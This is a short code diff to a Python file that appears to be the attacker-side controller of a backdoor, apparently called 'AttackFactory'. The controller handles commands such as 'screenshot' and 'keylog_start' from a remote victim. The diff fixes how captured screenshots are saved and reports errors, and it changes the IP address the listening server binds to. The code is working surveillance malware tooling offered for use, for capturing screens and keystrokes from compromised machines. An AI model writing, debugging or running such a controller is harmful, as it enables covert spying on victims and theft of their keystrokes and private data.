@@ -56,16 +56,18 @@ def shell():
 				reliable_send(result)
 				
 		elif command [:10] == "screenshot":
-			screen = open("screenshot d" + str(count) + ".png", "wb")		
+			screen = open("screenshot_" + str(count) + ".png", "wb")		
 			image = reliable_recv()
 			image_decoded = base64.b64decode(image)
-			if image_decoded [:3] == "[!]":
-				print(colored(image_decoded,'red'))
-			else:
+			if image_decoded[:3] != "[!]":
 				screen.write(image_decoded)
 				screen.close()
-				print(colored("[+] screenshot saved successfully as screenshot d"+str(count)+ ".png ","green"))
+				print(colored("[+] screenshot saved successfully as screenshot_"+str(count)+ ".png ","green"))
 				count += 1
+			else:
+				print(colored(image_decoded,'red'))
+				screen.close()
+				
 				
 		
 		elif command[:12] == "keylog_start":
@@ -113,7 +115,7 @@ def server():
 	
 	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 	s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
-	s.bind(('192.168.2.4',44445))
+	s.bind(('192.168.2.8',44445))
 	opt = input(colored('AttackFactory@Download~Backdoor.py(Y/n)~#$ ' ,'yellow'))
 	if opt == "Y" or opt == "y":
 		try:
